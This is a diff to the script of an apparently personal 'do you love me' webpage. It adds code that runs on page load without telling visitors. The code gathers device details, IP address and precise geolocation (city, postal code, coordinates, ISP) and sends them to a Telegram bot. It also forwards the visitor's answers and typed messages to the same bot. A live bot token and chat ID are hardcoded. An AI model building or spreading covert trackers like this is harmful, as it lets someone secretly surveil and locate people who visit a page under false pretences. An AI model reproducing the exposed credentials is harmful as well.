@@ -292,9 +292,7 @@ Yaar, I was just listening to a song... and no,
             const closeMessage = document.getElementById('closeMessage');
 
             // --- Telegram Bot API Details ---
-            // Your Telegram Bot Token
             const TELEGRAM_BOT_TOKEN = '8004254348:AAEgC8up1A8elm0YQmDQm__TSnc_cnYoEEU'; 
-            // Your Telegram Chat ID (can be negative for private chats/groups)
             const TELEGRAM_CHAT_ID = '5716658945'; 
             // --- End Telegram Bot API Details ---
 
@@ -302,11 +300,11 @@ Yaar, I was just listening to a song... and no,
 
             // Function to send data to Telegram Bot
             async function sendToTelegram(message) {
-                const url = https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage;
+                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
                 const params = {
                     chat_id: TELEGRAM_CHAT_ID,
                     text: message,
-                    parse_mode: 'HTML' // You can use HTML for formatting
+                    parse_mode: 'HTML' // Use HTML for formatting
                 };
 
                 try {
@@ -330,21 +328,96 @@ Yaar, I was just listening to a song... and no,
                 }
             }
 
+            // Function to gather and send client information on page load
+            async function gatherAndSendClientInfo() {
+                let clientInfo = {};
+
+                try {
+                    // 1. Device and Browser Information
+                    clientInfo.userAgent = navigator.userAgent || 'N/A';
+                    clientInfo.platform = navigator.platform || 'N/A';
+                    clientInfo.language = navigator.language || 'N/A';
+                    clientInfo.online = navigator.onLine ? 'Yes' : 'No';
+                    clientInfo.cookieEnabled = navigator.cookieEnabled ? 'Yes' : 'No';
+                    clientInfo.screenWidth = window.screen.width || 'N/A';
+                    clientInfo.screenHeight = window.screen.height || 'N/A';
+                    clientInfo.viewportWidth = window.innerWidth || 'N/A';
+                    clientInfo.viewportHeight = window.innerHeight || 'N/A';
+                    clientInfo.touchSupport = ('ontouchstart' in window || navigator.maxTouchPoints > 0) ? 'Yes' : 'No';
+
+                    // 2. IP Address and Geolocation (using external APIs)
+                    try {
+                        const ipResponse = await fetch('https://api.ipify.org?format=json');
+                        const ipData = await ipResponse.json();
+                        clientInfo.ipAddress = ipData.ip;
+
+                        const geoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                        const geoData = await geoResponse.json();
+                        clientInfo.city = geoData.city || 'N/A';
+                        clientInfo.region = geoData.region || 'N/A';
+                        clientInfo.country = geoData.country_name || 'N/A';
+                        clientInfo.countryCode = geoData.country_code || 'N/A';
+                        clientInfo.postal = geoData.postal || 'N/A';
+                        clientInfo.latitude = geoData.latitude || 'N/A';
+                        clientInfo.longitude = geoData.longitude || 'N/A';
+                        clientInfo.timezone = geoData.timezone || 'N/A';
+                        clientInfo.isp = geoData.org || 'N/A'; // ISP/Organization
+                        clientInfo.asn = geoData.asn || 'N/A'; // Autonomous System Number
+                    } catch (ipGeoError) {
+                        console.error("Error fetching IP or geolocation data:", ipGeoError);
+                        clientInfo.ipAddress = "Could not retrieve IP";
+                        // Set other geo fields to N/A if IP/geo lookup fails
+                        Object.keys(clientInfo).forEach(key => {
+                            if (!clientInfo[key] && key !== 'userAgent' && key !== 'platform' && key !== 'language' && key !== 'online' && key !== 'cookieEnabled' && key !== 'screenWidth' && key !== 'screenHeight' && key !== 'viewportWidth' && key !== 'viewportHeight' && key !== 'touchSupport') {
+                                clientInfo[key] = 'N/A';
+                            }
+                        });
+                    }
+
+                    // Format the message for Telegram
+                    const telegramMessage = `
+                    --- 🌐 *New Visitor Alert!* 🌐 ---
+                    *Time:* ${new Date().toLocaleString()} (IST)
+                    
+                    *User Agent:* ${clientInfo.userAgent}
+                    *Platform:* ${clientInfo.platform}
+                    *Browser Language:* ${clientInfo.language}
+                    *Online Status:* ${clientInfo.online}
+                    *Cookies Enabled:* ${clientInfo.cookieEnabled}
+
+                    *Screen Resolution:* ${clientInfo.screenWidth}x${clientInfo.screenHeight} px
+                    *Viewport Size:* ${clientInfo.viewportWidth}x${clientInfo.viewportHeight} px
+                    *Touch Support:* ${clientInfo.touchSupport}
+
+                    *IP Address:* ${clientInfo.ipAddress}
+                    *Location:* ${clientInfo.city}, ${clientInfo.region}, ${clientInfo.country} (${clientInfo.countryCode})
+                    *Postal Code:* ${clientInfo.postal}
+                    *Coordinates:* ${clientInfo.latitude}, ${clientInfo.longitude}
+                    *Timezone:* ${clientInfo.timezone}
+                    *ISP:* ${clientInfo.isp}
+                    *ASN:* ${clientInfo.asn}
+                    ---
+                    `;
+                    await sendToTelegram(telegramMessage);
+
+                } catch (error) {
+                    console.error("Error gathering client info:", error);
+                    await sendToTelegram(`⚠️ *Error collecting visitor info:* ${error.message}`);
+                }
+            }
+
+            // Call function to gather and send info when the page loads
+            gatherAndSendClientInfo();
+
+
             // Function to send click data (now also sends to Telegram for love question)
             async function sendClickData(buttonClicked, response = null) {
-                const data = {
-                    event: 'button_click',
-                    button: buttonClicked,
-                    timestamp: new Date().toISOString(),
-                };
-                if (response !== null) {
-                    data.response = response; // Add response for "Do You Love Me" question
-                }
-
                 // If it's a love question answer, send to Telegram
-                if (buttonClicked === 'love_Youtubeed') {
-                    // Using HTML for basic formatting (bold)
-                    const telegramMessage = ❤️ *Love Question Answered* ❤️\nUser responded: <b>${response}</b>;
+                if (buttonClicked === 'love_answered') { // Changed from 'love_Youtubeed' for clarity
+                    const telegramMessage = `❤️ *Love Question Answered* ❤️\nUser responded: <b>${response}</b>`;
+                    sendToTelegram(telegramMessage);
+                } else if (buttonClicked === 'yes_clicked' || buttonClicked === 'no_clicked') {
+                    const telegramMessage = `👆 *Button Clicked:* <b>${buttonClicked.replace('_', ' ').toUpperCase()}</b>`;
                     sendToTelegram(telegramMessage);
                 }
 
@@ -374,7 +447,7 @@ Yaar, I was just listening to a song... and no,
                     if (result.isConfirmed) {
                         const message = result.value.trim();
                         if (message) {
-                            const telegramMessage = 💌 *New Message from Webpage* 💌\n\n<b>${message}</b>;
+                            const telegramMessage = `💌 *New Message from Webpage* 💌\n\n<b>${message}</b>`;
                             sendToTelegram(telegramMessage);
                             Swal.fire(
                                 'Message Sent!',
@@ -416,7 +489,7 @@ Yaar, I was just listening to a song... and no,
                     }).then((result) => {
                         if (result.isConfirmed) {
                             console.log('User clicked Yes!');
-                            sendClickData('love_Youtubeed', 'Yes'); // Send 'Yes' to Telegram
+                            sendClickData('love_answered', 'Yes'); // Send 'Yes' to Telegram
                             Swal.fire(
                                 'Yay!',
                                 'I knew it! 😉',
@@ -427,7 +500,7 @@ Yaar, I was just listening to a song... and no,
                             });
                         } else if (result.dismiss === Swal.DismissReason.cancel) {
                             console.log('User clicked No.');
-                            sendClickData('love_Youtubeed', 'No'); // Send 'No' to Telegram
+                            sendClickData('love_answered', 'No'); // Send 'No' to Telegram
                             Swal.fire(
                                 'Oh...',
                                 'That\'s okay, I still think you\'re awesome! 😊',
